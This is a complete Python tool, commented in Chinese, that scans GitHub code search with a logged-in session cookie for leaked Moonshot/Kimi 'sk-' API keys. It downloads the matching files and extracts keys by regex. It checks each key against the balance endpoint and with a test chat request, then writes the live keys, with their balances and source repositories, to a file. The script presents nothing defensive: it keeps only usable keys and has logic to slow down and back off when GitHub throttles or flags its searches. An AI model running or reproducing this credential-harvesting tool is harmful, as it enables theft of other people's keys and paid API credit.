#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
专门扫描Moonshot API密钥的并发扫描器
支持多线程并发搜索以提高扫描速度
使用余额查询接口验证密钥有效性
"""

import os
import re
import time
import threading
import concurrent.futures
import random
from queue import Queue
import requests
from datetime import datetime
import json

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')
if not GITHUB_SESSION:
    print("⚠️ 警告: 未设置 GITHUB_SESSION 环境变量，无法使用网页搜索模式。")
    print("   请在 .env 文件中配置 GITHUB_SESSION=your_cookie_here")
    # 为了兼容性，如果不设置Session，可以抛出错误或者尝试其他方式，这里强制要求Session
    raise ValueError("请设置 GITHUB_SESSION 环境变量 (GitHub user_session Cookie)")

# Moonshot API 配置
MOONSHOT_BASE_URL = "https://api.moonshot.cn/v1"
MOONSHOT_CHAT_URL = f"{MOONSHOT_BASE_URL}/chat/completions"
MOONSHOT_BALANCE_URL = f"{MOONSHOT_BASE_URL}/users/me/balance"

# 支持的模型列表
MOONSHOT_MODELS = [
    "kimi-k2-0711-preview",
    "kimi-k2-0905-preview", 
    "kimi-k2-turbo-preview",
    "kimi-latest",
    "kimi-thinking-preview",
    "moonshot-v1-128k",
    "moonshot-v1-128k-vision-preview",
    "moonshot-v1-32k",
    "moonshot-v1-32k-vision-preview",
    "moonshot-v1-8k",
    "moonshot-v1-8k-vision-preview",
    "moonshot-v1-auto"
]

# 测试模型配置
TEST_MODEL = "moonshot-v1-8k"  # 用于测试的基础模型

# 并发配置
MAX_WORKERS = 5  # 最大并发线程数
API_DELAY = 1.5  # API请求间隔（秒）
MAX_RESULTS_PER_QUERY = 500  # 每个查询最多检查的结果数

# 存储结果的线程安全队列
live_keys_queue = Queue()    # 存活密钥
processed_keys = set()       # 防止重复处理相同密钥
lock = threading.Lock()

def get_headers():
    """构造 GitHub 搜索请求头"""
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    }

# --- Moonshot API 相关函数 ---

def get_balance(api_key):
    """获取账户余额信息"""
    try:
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
        
        response = requests.get(MOONSHOT_BALANCE_URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get("code") == 0 and data.get("status"):
                balance_data = data.get("data", {})
                return {
                    "success": True,
                    "available_balance": float(balance_data.get("available_balance", 0)),
                    "voucher_balance": float(balance_data.get("voucher_balance", 0)),
                    "cash_balance": float(balance_data.get("cash_balance", 0)),
                    "total_balance": float(balance_data.get("available_balance", 0))
                }
        
        return {"success": False, "error": f"HTTP {response.status_code}: {response.text}"}
        
    except Exception as e:
        return {"success": False, "error": str(e)}

def test_chat_completion(api_key, model_name):
    """测试聊天完成接口"""
    try:
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "model": model_name,
            "messages": [
                {"role": "user", "content": "Hello"}
            ],
            "max_tokens": 1,
            "temperature": 0.1
        }
        
        response = requests.post(MOONSHOT_CHAT_URL, 
                               headers=headers, 
                               json=payload, 
                               timeout=15)
        
        if response.status_code == 200:
            return {"success": True, "model": model_name}
        else:
            return {"success": False, "error": f"HTTP {response.status_code}: {response.text}"}
            
    except Exception as e:
        return {"success": False, "error": str(e)}

def check_moonshot_key(key):
    """验证Moonshot API密钥是否有效"""
    if not key.startswith("sk-"):
        return {"status": "无效格式", "type": "invalid"}
    
    # 获取余额信息
    balance_info = get_balance(key)
    if not balance_info["success"]:
        return {
            "status": f"🔴 无效/已吊销 (Invalid/Revoked): {balance_info['error'][:100]}",
            "type": "invalid"
        }
    
    # 检查余额
    total_balance = balance_info.get("total_balance", 0)
    available_balance = balance_info.get("available_balance", 0)
    voucher_balance = balance_info.get("voucher_balance", 0)
    cash_balance = balance_info.get("cash_balance", 0)
    
    if available_balance <= 0:
        return {
            "status": f"🔴 账户无余额 (No Balance) - 可用余额: ${available_balance:.5f}",
            "type": "no_balance",
            "balance_info": balance_info
        }
    
    # 测试聊天完成接口
    chat_test = test_chat_completion(key, TEST_MODEL)
    if chat_test["success"]:
        return {
            "status": f"🟢 密钥存活 (Live) - 可用余额: ${available_balance:.5f} (代金券: ${voucher_balance:.5f}, 现金: ${cash_balance:.5f})",
            "type": "live",
            "balance_info": balance_info,
            "model_access": TEST_MODEL
        }
    else:
        return {
            "status": f"🟡 有余额但API访问失败 (Balance but API Failed): {chat_test['error'][:100]}",
            "type": "limited",
            "balance_info": balance_info
        }

def process_file_url(file_url, worker_id):
    """处理单个文件URL，下载内容并提取API密钥"""
    try:
        # 构造Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            # 将HTML URL转换为Raw URL
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        try:
            resp = requests.get(raw_url, timeout=15)
            if resp.status_code != 200:
                return
            
            file_content = resp.text
        except Exception as e:
            print(f"[Worker-{worker_id}] ❌ 下载出错: {e}")
            return
        
        # 使用正则表达式提取sk-密钥
        pattern = r'(sk-[A-Za-z0-9_-]{40,})'
        potential_keys = re.findall(pattern, file_content)
        
        for key in potential_keys:
            with lock:
                if key in processed_keys:
                    continue
                processed_keys.add(key)
            
            # 验证密钥
            result = check_moonshot_key(key)
            print(f"[Worker-{worker_id}] 🔑 发现密钥: {key[:20]}... | 状态: {result['status']}")
            
            # 只记录存活的密钥
            if result["type"] in ["live", "limited"]:
                # 从URL中解析仓库信息
                repo_match = re.search(r'githubusercontent\.com/([^/]+/[^/]+)', raw_url)
                repo_name = repo_match.group(1) if repo_match else "unknown/repo"

                key_info = {
                    'type': 'Moonshot API Key',
                    'key': key,
                    'status': result['status'],
                    'account_type': result['type'],
                    'balance_info': result.get('balance_info', {}),
                    'model_access': result.get('model_access', 'N/A'),
                    'url': file_url,
                    'repo': repo_name,
                    'file_path': raw_url,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'worker_id': worker_id
                }
                live_keys_queue.put(key_info)
                print(f"[Worker-{worker_id}] ✅ 已记录存活密钥")
            
            # 添加延迟以避免API速率限制
            time.sleep(API_DELAY)
            
    except Exception as e:
        print(f"[Worker-{worker_id}] ❌ 处理文件时出错: {e}")

def search_github_session(query, max_pages=5):
    """使用Session搜索GitHub，返回文件链接列表"""
    found_links = set()
    
    print(f"📡 执行搜索查询: {query}")
    
    for page in range(1, max_pages + 1):
        params = {
            'q': query,
            'type': 'code',
            'p': page,
            'o': 'desc',
            's': 'indexed'
        }
        url = "https://github.com/search"
        
        try:
            resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
            
            if resp.status_code != 200:
                print(f"   ❌ 请求失败 Page {page}: HTTP {resp.status_code}")
                if resp.status_code == 429:
                    print("   ⚠️ 触发频控，暂停 60 秒...")
                    time.sleep(60)
                break
            
            if "Sign in to GitHub" in resp.text or "Wait a few minutes before you try again" in resp.text:
                print("   ❌ Session失效 或 触发 Abuse Detection")
                break
                
            # 提取链接
            links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
            
            # 如果没有链接，尝试另一种正则
            if not links:
                links_v2 = re.findall(r'href="(/[^\s"]+/blob/(?:[^"]+)?)#L\d+"', resp.text)
                if links_v2:
                    links.extend(links_v2)
            
            if not links:
                if page == 1:
                    print(f"   ⚠️ Page 1 无结果。")
                break
            
            unique_links_page = set()
            for link in links:
                clean_link = link.split('#')[0]
                if clean_link.endswith(".md") or clean_link.endswith(".txt"):
                    continue
                full_link = "https://github.com" + clean_link
                unique_links_page.add(full_link)
            
            print(f"   Page {page}: 找到 {len(unique_links_page)} 个结果")
            found_links.update(unique_links_page)
                
            # 翻页延迟
            time.sleep(random.uniform(2, 4))
            
        except Exception as e:
            print(f"   ❌ 搜索出错: {e}")
            break
            
    return list(found_links)

def concurrent_search_and_validate():
    """并发搜索和验证Moonshot密钥"""
    print(f"🚀 开始并发搜索Moonshot密钥 (并发数: {MAX_WORKERS})")
    print(f"ℹ️ 使用 GitHub Session 网页搜索模式")
    print("=" * 60)
    
    # 定义搜索查询
    # 支持正则表达式搜索
    search_queries = [
        '/sk-[A-Za-z0-9_-]{40,}/',
        '"api.moonshot.cn" "sk-"',
        '"moonshot" "sk-"',
        '"kimi" "sk-"',
        'MOONSHOT_API_KEY',
        'KIMI_API_KEY',
    ]
    
    all_file_urls = set()
    
    # 收集所有搜索结果
    for query in search_queries:
        urls = search_github_session(query, max_pages=5)
        print(f"   👉 查询 '{query}' 找到 {len(urls)} 个文件")
        all_file_urls.update(urls)
        time.sleep(2)
    
    file_list = list(all_file_urls)
    print(f"🗂️ 去重后共 {len(file_list)} 个唯一文件需要处理")
    
    # 使用线程池并发处理文件
    if file_list:
        print(f"⚡ 启动 {MAX_WORKERS} 个工作线程进行并发处理...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # 提交所有任务
            future_to_url = {}
            for i, url in enumerate(file_list):
                worker_id = (i % MAX_WORKERS) + 1
                future = executor.submit(process_file_url, url, worker_id)
                future_to_url[future] = url
            
            # 等待所有任务完成
            completed = 0
            total = len(file_list)
            for future in concurrent.futures.as_completed(future_to_url):
                completed += 1
                if completed % 10 == 0 or completed == total:
                    print(f"📊 进度: {completed}/{total} ({(completed/total)*100:.1f}%)")
                try:
                    future.result()
                except Exception as e:
                    url = future_to_url[future]
                    print(f"❌ 处理任务失败: {url} - {e}")
    
    print("\n✅ 所有文件处理完成")

def save_results():
    """保存扫描结果到文件"""
    live_keys = []
    
    # 从队列中获取所有结果
    while not live_keys_queue.empty():
        live_keys.append(live_keys_queue.get())
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # 保存存活密钥
    if live_keys:
        filename = f'moonshot_live_keys_{timestamp}.txt'
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=== Moonshot API密钥扫描结果 ===\n")
            f.write(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"发现存活密钥数量: {len(live_keys)}\n")
            f.write(f"支持的模型: {', '.join(MOONSHOT_MODELS)}\n")
            f.write("=" * 60 + "\n\n")
            
            for i, key_info in enumerate(live_keys, 1):
                f.write(f"{i}. {key_info['type']}\n")
                f.write(f"   密钥: {key_info['key']}\n")
                f.write(f"   状态: {key_info['status']}\n")
                f.write(f"   账户类型: {key_info['account_type']}\n")
                f.write(f"   可用模型: {key_info['model_access']}\n")
                
                balance_info = key_info.get('balance_info', {})
                if balance_info:
                    f.write(f"   可用余额: ${balance_info.get('available_balance', 0):.5f}\n")
                    f.write(f"   代金券余额: ${balance_info.get('voucher_balance', 0):.5f}\n")
                    f.write(f"   现金余额: ${balance_info.get('cash_balance', 0):.5f}\n")
                
                f.write(f"   仓库: {key_info['repo']}\n")
                f.write(f"   文件: {key_info['file_path']}\n")
                f.write(f"   链接: {key_info['url']}\n")
                f.write(f"   发现时间: {key_info['discovered_time']}\n")
                f.write("-" * 60 + "\n")
        
        print(f"🌙 已将 {len(live_keys)} 个存活密钥保存到: {filename}")
    
    if not live_keys:
        print("\n📝 未发现存活的Moonshot密钥")

def main():
    """主函数"""
    print("🔍 Moonshot API密钥并发扫描器")
    print("=" * 50)
    print(f"⚙️ 配置:")
    print(f"   - 最大并发线程数: {MAX_WORKERS}")
    print(f"   - API请求延迟: {API_DELAY}秒")
    print(f"   - 每个查询最大结果数: {MAX_RESULTS_PER_QUERY}")
    print(f"   - 测试模型: {TEST_MODEL}")
    print(f"   - 支持模型数量: {len(MOONSHOT_MODELS)}")
    print("=" * 50)
    
    start_time = time.time()
    
    try:
        print("\n🚀 开始扫描...")
        
        # 执行并发搜索和验证
        concurrent_search_and_validate()
        
        # 保存结果
        save_results()
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        print(f"\n🏁 扫描完成!")
        print(f"⏱️ 总耗时: {elapsed_time:.2f}秒")
        print(f"🔧 处理的唯一密钥数: {len(processed_keys)}")
        print(f"🌙 发现存活密钥数: {live_keys_queue.qsize()}")
        
    except KeyboardInterrupt:
        print("\n🛑 用户中断扫描")
        save_results()  # 保存已找到的结果
    except Exception as e:
        print(f"\n❌ 扫描过程中发生错误: {e}")
        save_results()  # 保存已找到的结果

if __name__ == '__main__':
    main()
